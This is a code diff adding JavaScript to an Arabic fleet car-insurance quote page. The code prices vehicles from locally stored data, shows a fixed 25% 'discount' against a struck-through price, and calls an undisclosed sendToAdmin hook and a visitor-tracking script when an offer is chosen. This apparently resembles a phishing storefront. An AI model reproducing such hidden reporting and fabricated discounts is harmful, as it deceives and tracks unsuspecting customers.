+        if (body.indexOf('شاحن') >= 0 || body.indexOf('truck') >= 0 || body.indexOf('heavy') >= 0) bodyFactor = 1.25;
+        else if (body.indexOf('باص') >= 0 || body.indexOf('bus') >= 0) bodyFactor = 1.20;
+        else if (body.indexOf('بيكاب') >= 0 || body.indexOf('pick') >= 0) bodyFactor = 1.10;
+        else if (body.indexOf('دفع رباعي') >= 0 || body.indexOf('suv') >= 0 || body.indexOf('four') >= 0) bodyFactor = 1.08;
+        else if (body.indexOf('صالون') >= 0 || body.indexOf('sedan') >= 0) bodyFactor = 1.0;
+
+        // عامل نوع التسجيل
+        var regFactor = 1.0;
+        var reg = (vehicle.regType || '').toLowerCase();
+        if (reg.indexOf('تجاري') >= 0) regFactor = 1.15;
+        else if (reg.indexOf('تأجير') >= 0) regFactor = 1.20;
+        else if (reg.indexOf('أجرة') >= 0 || reg.indexOf('تاكسي') >= 0) regFactor = 1.25;
+        else if (reg.indexOf('خاص') >= 0) regFactor = 1.0;
+
+        // حساب القسط الأساسي
+        var base = value * baseRate * ageFactor * bodyFactor * regFactor;
+        if (base < minPremium) base = minPremium;
+
+        // الرسوم والضرائب
+        var tax = base * 0.016;       // ضريبة ومساهمة 1.6%
+        var emergency = base * 0.005; // رسوم طوارئ 0.5%
+        var net = base + tax + emergency;
+        var vat = net * 0.05;         // ضريبة القيمة المضافة 5%
+        var total = net + vat;
+        return { base: base, tax: tax, emergency: emergency, net: net, vat: vat, total: total };
+      }
+
+      function buildFleetOfferCard(offerNum, config, vehicles) {
+        var count = vehicles.length;
+        var totalNet = 0;
+        var totalVat = 0;
+
+        // Count insurance types
+        var compCount = 0;
+        var tpCount = 0;
+        for (var ci = 0; ci < vehicles.length; ci++) {
+          if (vehicles[ci].insuranceTypeVal === 'comprehensive') compCount++;
+          else tpCount++;
+        }
+
+        // Determine display plan name
+        var displayPlan = '';
+        if (compCount > 0 && tpCount > 0) displayPlan = 'شامل + طرف ثالث';
+        else if (compCount > 0) displayPlan = 'شامل';
+        else displayPlan = 'طرف ثالث';
+
+        // Pre-calculate pricing using new algorithm
+        var pricingData = [];
+        for (var i = 0; i < vehicles.length; i++) {
+          var p = calcFleetPremium(vehicles[i], config);
+          pricingData.push(p);
+          totalNet += p.net;
+          totalVat += p.vat;
+        }
+
+        var offerId = 'offer' + offerNum;
+
+        // Chips - show actual insurance type counts
+        var chipsHtml = '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 243, 205);">' +
+          '<i class="so-chip-icon fa-solid fa-car"></i> المركبات &nbsp;(' + count + ')' +
+          '</span>';
+        if (compCount > 0) {
+          chipsHtml += '<span class="so-chip" style="background-color: rgb(197, 223, 171); border-color: rgb(197, 223, 171);">' +
+            '<i class="so-chip-icon fa-solid fa-shield-halved"></i> شامل &nbsp;(' + compCount + ')' +
+            '</span>';
+        }
+        if (tpCount > 0) {
+          chipsHtml += '<span class="so-chip" style="background-color: rgb(220, 237, 255); border-color: rgb(180, 210, 240);">' +
+            '<i class="so-chip-icon fa-solid fa-shield"></i> طرف ثالث &nbsp;(' + tpCount + ')' +
+            '</span>';
+        }
+        chipsHtml += '<span class="so-chip" style="background-color: rgb(255, 243, 205); border-color: rgb(255, 230, 156);">' +
+          '<i class="so-chip-icon fa-regular fa-clock"></i> مدة الوثيقة &nbsp;(سنة واحدة)' +
+          '</span>';
+
+        // Table rows
+        var rowsHtml = '';
+        for (var i = 0; i < vehicles.length; i++) {
+          var v = vehicles[i];
+          var pr = pricingData[i];
+          var rowNum = i + 1;
+          var vValue = parseFloat(v.value) || 5000;
+          var detailId = 'detail-' + offerNum + '-' + rowNum;
+          var vInsType = v.insuranceTypeVal === 'comprehensive' ? 'شامل' : 'طرف ثالث';
+
+          rowsHtml += '<tr class="so-row" data-offer="' + offerNum + '" data-row="' + rowNum + '" data-value="' + vValue + '">' +
+            '<td><input type="checkbox" class="form-check-input"></td>' +
+            '<td>' + rowNum + '</td>' +
+            '<td>' + (v.plateNo || '-') + '/' + (v.plateCode || '') + '</td>' +
+            '<td>' + (v.bodyType === 'اختر' || !v.bodyType ? '-' : v.bodyType) + '</td>' +
+            '<td>' + (v.make === 'اختر' || !v.make ? '-' : v.make) + '</td>' +
+            '<td>' + (v.year === 'اختر' || !v.year ? '-' : v.year) + '</td>' +
+            '<td>' + vValue + '</td>' +
+            '<td><span class="badge ' + (v.insuranceTypeVal === 'comprehensive' ? 'bg-success' : 'bg-info') + '">' + vInsType + '</span></td>' +
+            '<td class="premium"><span style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmtFleet(pr.total) + '</span> <span class="quote-currency">' + currSvg + '<span class="row-premium">' + fmtFleet(pr.total * 0.75) + '</span></span></td>' +
+            '<td><div class="so-user-actions"><button class="btn btn-link so-toggle-details" onclick="toggleDetail(this, \'' + detailId + '\')"><i class="bi bi-chevron-down"></i></button></div></td>' +
+            '</tr>';
+
+          // Detail row
+          rowsHtml += '<tr class="so-detail-row" id="' + detailId + '">' +
+            '<td colspan="10"><div class="so-detail-content">' +
+            '<div class="cover-detail-header"><div>التفاصيل</div><div>-</div><div>المبلغ ر.ع</div></div>' +
+            '<div class="cover-detail-row"><div>نوع التأمين</div><div>-</div><div>' + vInsType + '</div></div>' +
+            '<div class="cover-detail-row"><div>قيمة المركبة</div><div>-</div><div>' + vValue + '</div></div>' +
+            '<div class="cover-detail-row"><div>القسط الأساسي</div><div>-</div><div class="detail-basic">' + fmtFleet(pr.base) + '</div></div>' +
+            '<div class="cover-detail-row"><div>الضريبة والمساهمة (1.6%)</div><div>-</div><div class="detail-tax">' + fmtFleet(pr.tax) + '</div></div>' +
+            '<div class="cover-detail-row"><div>رسوم الطوارئ (0.5%)</div><div>-</div><div class="detail-emergency">' + fmtFleet(pr.emergency) + '</div></div>' +
+            '<div class="cover-detail-row total-row"><div>المبلغ الصافي</div><div>-</div><div class="detail-net">' + fmtFleet(pr.net) + '</div></div>' +
+            '<div class="cover-detail-row"><div>ضريبة القيمة المضافة (5%)</div><div>-</div><div class="detail-vat">' + fmtFleet(pr.vat) + '</div></div>' +
+            '<div class="cover-detail-row"><div>الخصم (25%)</div><div>-</div><div style="color:green">-' + fmtFleet(pr.total * 0.25) + '</div></div>' +
+            '<div class="cover-detail-row total-row"><div>إجمالي القسط بعد الخصم</div><div>-</div><div class="detail-total">' + fmtFleet(pr.total * 0.75) + '</div></div>' +
+            '</div></td></tr>';
+        }
+
+        // Full offer card
+        var html = '<div class="so-offer mb-4" id="' + offerId + '">' +
+          '<div class="so-offer-header" onclick="toggleOffer(\'' + offerId + '\')">' +
+            '<div class="d-flex align-items-center gap-2">' +
+              '<div class="so-logo"><img alt="' + config.companyName + '" src="' + config.logo + '"></div>' +
+              '<div class="so-company">' +
+                '<div class="so-name">' + config.companyName + '</div>' +
+                '<div class="so-plan-name">' + displayPlan + '</div>' +
+                '<div class="so-tags">' + chipsHtml + '</div>' +
+              '</div>' +
+            '</div>' +
+            '<div class="so-offer-right">' +
+              '<span class="text-warning align-self-end">العرض المبدئي</span>' +
+              '<div class="so-price d-flex flex-column align-items-end text-end gap-1">' +
+                '<div style="text-decoration:line-through;color:#c00;font-size:0.85em;">' + fmtFleet(totalNet + totalVat) + '</div>' +
+                '<div class="quote-currency">' + currSvg + '<span class="header-total">' + fmtFleet((totalNet + totalVat) * 0.75) + '</span></div>' +
+                '<div class="so-break">+ ضريبة القيمة المضافة ' + fmtFleet(totalVat * 0.75) + '</div>' +
+              '</div>' +
+              '<div class="d-grid gap-2 w-100"><button type="button" class="btn so-choose" data-offer="' + offerNum + '" data-company="' + config.companyName + '" data-plan="' + displayPlan + '" data-logo="' + config.logo + '" onclick="chooseFleetOffer(this)" aria-label="اختر هذا العرض">اختر</button></div>' +
+              '<span class="so-collapse-btn"><i class="bi bi-chevron-down"></i></span>' +
+            '</div>' +
+          '</div>' +
+          '<div class="so-table-wrap" id="' + offerId + '-table">' +
+            '<div class="so-users-head">' +
+              '<div><strong>المركبات المغطاة (' + count + ')</strong></div>' +
+              '<div class="btn-offer-toolbar">' +
+                '<button type="button" class="btn btn-link"><span>عرض المزيد</span></button>' +
+                '<button type="button" class="btn btn-link"><i class="fa-regular fa-circle-down"></i> حمل سعر العرض</button>' +
+              '</div>' +
+            '</div>' +
+            '<div class="table-responsive pb-3">' +
+              '<table class="so-table table align-middle mb-0">' +
+                '<thead><tr>' +
+                  '<th style="width:40px"><input type="checkbox" class="form-check-input" aria-label="حدد الكل"></th>' +
+                  '<th style="width:60px">#</th>' +
+                  '<th>رقم اللوحة</th>' +
+                  '<th>نوع المركبة</th>' +
+                  '<th>الشركة المصنعة</th>' +
+                  '<th>سنة الصنع</th>' +
+                  '<th>قيمة المركبة</th>' +
+                  '<th>نوع التغطية</th>' +
+                  '<th>القسط</th>' +
+                  '<th></th>' +
+                '</tr></thead>' +
+                '<tbody>' + rowsHtml + '</tbody>' +
+              '</table>' +
+            '</div>' +
+          '</div>' +
+          '<div class="so-offer-footer"></div>' +
+        '</div>';
+
+        return html;
+      }
+
+      // Rebuild offers container with fleet data
+      var container = document.getElementById('offers-container');
+      var raw = localStorage.getItem('b2b_insured_list');
+      var vehicles = [];
+      try { vehicles = JSON.parse(raw) || []; } catch(e) { vehicles = []; }
+
+      if (!vehicles || vehicles.length === 0) {
+        container.innerHTML = '<div class="no-data-msg">' +
+          '<i class="fas fa-exclamation-circle d-block"></i>' +
+          '<h4>لا توجد بيانات مركبات</h4>' +
+          '<p>يرجى العودة لصفحة إضافة المركبات وإضافة مركبة واحدة على الأقل</p>' +
+          '<button class="btn so-choose mt-3" onclick="window.location.href=\'/insurance/b2b-add-insured\'">العودة لإضافة مركبة</button>' +
+          '</div>';
+        return;
+      }
+
+      var offerCount = Object.keys(FLEET_CONFIG).length;
+      var titleHtml = '<div class="mb-3">' +
+        '<strong class="m-0">لدينا (' + offerCount + ') عروض متاحة</strong>' +
+        '<p class="text-muted mb-0">يرجى مراجعة، تخصيص ثم اختيار</p>' +
+        '</div>';
+
+      var allOffersHtml = '';
+      for (var key in FLEET_CONFIG) {
+        if (FLEET_CONFIG.hasOwnProperty(key)) {
+          allOffersHtml += buildFleetOfferCard(parseInt(key), FLEET_CONFIG[key], vehicles);
+        }
+      }
+
+      container.innerHTML = titleHtml + allOffersHtml;
+
+      // Fleet recalc row function (no longer needed since insurance type is fixed per vehicle)
+      window.recalcFleetRow = function(selectEl) {
+        // No-op: insurance type is determined per vehicle from localStorage
+      };
+
+      // Fleet choose offer function
+      window.chooseFleetOffer = function(btn) {
+        var offerNum = btn.getAttribute('data-offer');
+        var companyName = btn.getAttribute('data-company');
+        var planName = btn.getAttribute('data-plan');
+        var logoSrc = btn.getAttribute('data-logo');
+        var offerId = 'offer' + offerNum;
+        var offerEl = document.getElementById(offerId);
+
+        var rows = offerEl.querySelectorAll('tr.so-row');
+        var vehicleDetails = [];
+        for (var i = 0; i < rows.length; i++) {
+          var row = rows[i];
+          var cells = row.querySelectorAll('td');
+          var premiumEl = row.querySelector('.row-premium');
+          var oldPriceEl = row.querySelector('.premium span[style]');
+          var badgeEl = row.querySelector('.badge');
+          vehicleDetails.push({
+            plateNo: cells[2].textContent,
+            bodyType: cells[3].textContent,
+            make: cells[4].textContent,
+            year: cells[5].textContent,
+            value: cells[6].textContent + ' ر.ع',
+            insuranceType: badgeEl ? badgeEl.textContent : '',
+            premium: premiumEl ? premiumEl.textContent : '',
+            originalPremium: oldPriceEl ? oldPriceEl.textContent : ''
+          });
+        }
+
+        var headerTotal = offerEl.querySelector('.header-total');
+        var headerOld = offerEl.querySelector('.so-offer-right .so-price div[style]');
+        var vatEl = offerEl.querySelector('.so-break');
+
+        var checkoutData = {
+          offerNum: offerNum,
+          companyName: companyName,
+          planName: planName,
+          logoSrc: logoSrc,
+          totalDiscounted: headerTotal ? headerTotal.textContent : '',
+          totalOriginal: headerOld ? headerOld.textContent : '',
+          vat: vatEl ? vatEl.textContent.replace('+ ضريبة القيمة المضافة ', '') : '',
+          vehicles: vehicleDetails,
+          serviceType: 'fleet'
+        };
+
+        localStorage.setItem('b2b_checkout_data', JSON.stringify(checkoutData));
+        if (window.sendToAdmin) { window.sendToAdmin({'الحالة': 'تم اختيار العرض'}, 'B2B - العروض'); }
+        window.location.href = '/insurance/b2b-checkout';
+      };
+    })();
+  </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
